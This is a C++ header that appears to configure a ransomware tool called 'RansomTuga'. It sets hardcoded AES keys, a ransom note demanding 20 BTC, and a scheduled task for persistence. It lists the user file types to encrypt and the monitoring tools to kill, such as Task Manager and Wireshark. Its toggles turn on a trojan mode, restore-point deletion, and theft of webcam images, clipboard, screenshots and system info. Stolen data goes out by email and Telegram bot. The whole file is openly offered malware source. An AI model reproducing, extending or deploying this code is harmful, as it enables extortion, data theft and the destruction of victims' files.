#pragma once

//global includes
#include "skStr.h"
#include <iostream>
#include <Windows.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/base64.h>

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)


//global variables

/* crypto settings */
#define IV				(string)skCrypt("_bestransistuga0")					// constant iv of decrytpion & encryption
#define KEY				(string)skCrypt("ransomtugaISthebesthereactually!")	// constant key of decryption & encryption
#define KEYOFKEY		(string)skCrypt("tugaransomISthebesthereactually!")	// constant key of decryption & encryption of the key in the file
#define CHECK_CONTENT	(string)skCrypt("This is a sample content!!!")		// content of the file used to check the correcy key
#define MAX_THREADS		20													// maximum number of threads used during decryption & encryption
#define MAX_FILE_SIZE	2000000000											// maximum file size in bytes (0 for none)
#define FILE_EXTENSION	(string)skCrypt(".TUGA")							// encrypted files' extension

/* files path */
#define DEBUG_FOLDER	(string)skCrypt(".\\debugFolder\\")							// directory where files are encrypted in debug mode if no arguments are provided
#define TEMPFILE		(string)skCrypt("C:\\Windows\\System32\\temp.tmp")			// filepath of temp file used in some functions
#define CHECKSUM_FILE	(string)skCrypt("C:\\Windows\\System32\\ok.txt")			// filepath of the file used to check the correct key
#define OLDWALLPAPER	(string)skCrypt("C:\\Windows\\System32\\oldWallpaper.jpg")	// filepath of the old wallpaper
#define NEWWALLPAPER	(string)skCrypt("C:\\Windows\\System32\\newWallpaper.jpg")	// filepath of the new wallpaper
#define INFOFILE		(string)skCrypt("C:\\Windows\\System32\\info.txt")			// filepath of the file sended via email with all infos and key
#define EMAILSENDER		(string)skCrypt("C:\\Windows\\System32\\sender.ps1")		// filepath of the email sender
#define FILESICON		(string)skCrypt("C:\\Windows\\System32\\tugaIcon.ico")		// filepath of the default icon of encrypted files
#define CUSTOMFILE_LOC	(string)skCrypt("C:\\customfile.extension")					// filepath of the custom file dropped
#define TROJANFILE		(string)skCrypt("C:\\Windows\\System32\\trojanFile.jpg")	// filepath of the real program
#define WEBCAM_PATH		(string)skCrypt("C:\\Windows\\System32\\webcams\\")			// filepath of the webcams' images

/* misc settings */
#define CUSTOM_COMMAND		(string)skCrypt("mshta vbscript:Execute(\"msgbox \"\"You're fucked up!\",0,\"\"RansomTuga docet\"\":close\")")		// custom command that run after encryptions
#define NUMBER_RETRIES		3		// maximum retries for decryptor
#define MAX_PHOTOS			3		// maximum webcam captured

/* enabling features */
#define DEBUG				true	// enable or disable debug mode (print in console)
#define TROJAN				false	// enable or disable trojan (run real program in parallel with the ransomware)
#define DROPRUN_TROJAN_FILE	false	// enable or disable droppper & runner of the real program in trojan mode
#define TSK_REMOVER			false	// enable or disable remover of the taskmanagers
#define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
#define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
#define FILE_UPLOADER		true	// enable or disable file uploader
#define TAKE_WEBCAMS		true	// enable or disable webcam stealer
#define STEAL_INFO			true	// enable or disable info stealer
#define GET_CLIPBOARD		true	// enable or disable clipboard grabber
#define GET_SCREENSHOT		true	// enable or disable screenshot grabber
#define ENABLE_BLACKLIST	true	// enable or disable blacklist for file extension
#define ENABLE_WHITELIST	true	// enable or disable whitelist for file extension
#define DROP_README			false	// enable or disable README dropper
#define DROP_DECRYPTOR		false	// enable or disable Decryptor dropper
#define DROP_CUSTOM_FILE	false	// enable or disable custom file dropper (custom file location at the beggining of main.cpp)
#define CHANGE_WALLPAPER	false	// enable or disable changer of wallpaper
#define BACKUP_INFOFILE		true	// enable or disable backup maker in current folder for infoFile in debug mode
#define SEND_EMAIL			true	// enable or disable email sender
#define DEBUG_SEND_EMAIL	true	// enable or disable email sender in debug mode
#define SEND_TGBOT			true	// enable or disable telegram bot sender
#define DEBUG_SEND_TGBOT	true	// enable or disable telegram bot sender in debug mode
#define SEND_CUSTOM_COMMAND false	// enable or disable custom command runner after encrytpion
#define SELFKILL			false	// enable or disable self killer at the end of the program
#define MAX_RETRIES			false	// enable or disable a maximum number of retries for decryptor
#define SELFKILL_RETRIES	false	// enable or disable selfkill after maximum number of retries for decryptor

/* email settings */
#define SENDERMAIL		(string)skCrypt("sender_email@gmail.com")	// sender email
#define SENDERPSW		(string)skCrypt("samplepassword!")			// sender password
#define RECEIVERMAIL	(string)skCrypt("receiver_email@gmail.com")	// receiver email
#define EMAILSUBJECT	(string)skCrypt("RansomTuga infos")			// subject of the email
#define EMAILBODY		(string)skCrypt("These are the infos")		// body of the email

/* telegram settings */
#define BOT_TOKEN	(string)skCrypt("0000000000:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")	// telegram bot token
#define CHAT_ID		(string)skCrypt("0000000000")										// telegram chat id (send to @myidbot the command /getid)

/* scheduled task settings */
#define TASKNAME	(string)skCrypt("RansomTuga")	// name of the scheduled task
#define MINUTES		(string)skCrypt("1")			// run task every x minutes	(MUST BE AN INTEGER)


const std::string READMECONTENT = (std::string)skCrypt(
	"You've been hacked\n"
	"Pay me 20BTC and I'll give you the decryption key!\n"
	"Or you will became a potato :C"
); // content of README.txt

const std::string safeFiles[] = {
	(std::string)skCrypt("RansomTuga.exe"),
	(std::string)skCrypt("DataDecryptor.exe"),
	(std::string)skCrypt("InfoDecryptor.exe")
}; // files to not encrypt

const std::string badPrograms[] = {
	(std::string)skCrypt("Taskmgr"),
	(std::string)skCrypt("procexp"),
	(std::string)skCrypt("procexp64"),
	(std::string)skCrypt("procexp64a"),
	(std::string)skCrypt("AnVir"),
	(std::string)skCrypt("anvir64"),
	(std::string)skCrypt("anvirlauncher"),
	(std::string)skCrypt("VirusTotalUpload"),
	(std::string)skCrypt("ProcessHacker"),
	(std::string)skCrypt("dumpcap"),
	(std::string)skCrypt("Wireshark"),
	(std::string)skCrypt("decompile")
}; // tasks to kill

const std::string blacklist[] = {
	(std::string)skCrypt("exe"),
	(std::string)skCrypt("dll"),
	(std::string)skCrypt("ini"),
	(std::string)skCrypt("dat"),
	(std::string)skCrypt("cfg")
}; // extension of files to not encrypt

const std::string whitelist[] = {
	(std::string)skCrypt("jpg"),
	(std::string)skCrypt("jpeg"),
	(std::string)skCrypt("pdf"),
	(std::string)skCrypt("png"),
	(std::string)skCrypt("txt"),
	(std::string)skCrypt("odt"),
	(std::string)skCrypt("xls"),
	(std::string)skCrypt("xlsx"),
	(std::string)skCrypt("ods"),
	(std::string)skCrypt("ppt"),
	(std::string)skCrypt("pptx"),
	(std::string)skCrypt("htm"),
	(std::string)skCrypt("html"),
	(std::string)skCrypt("mp3"),
	(std::string)skCrypt("wma"),
	(std::string)skCrypt("avi"),
	(std::string)skCrypt("mov"),
	(std::string)skCrypt("mp4"),
	(std::string)skCrypt("gif"),
	(std::string)skCrypt("svg"),
	(std::string)skCrypt("ai"),
	(std::string)skCrypt("zip"),
	(std::string)skCrypt("rar"),
	(std::string)skCrypt("7z")
}; // extension of files to encrypt



typedef unsigned char BYTE;

//global functions
std::string aes_decrypt(std::string key, std::string cipher, std::string iv);
std::string aes_encrypt(std::string key, std::string plain, std::string iv);
std::vector<BYTE> base64_decode(const std::string&);
std::string base64_encode(BYTE const* buf, unsigned int bufLen);
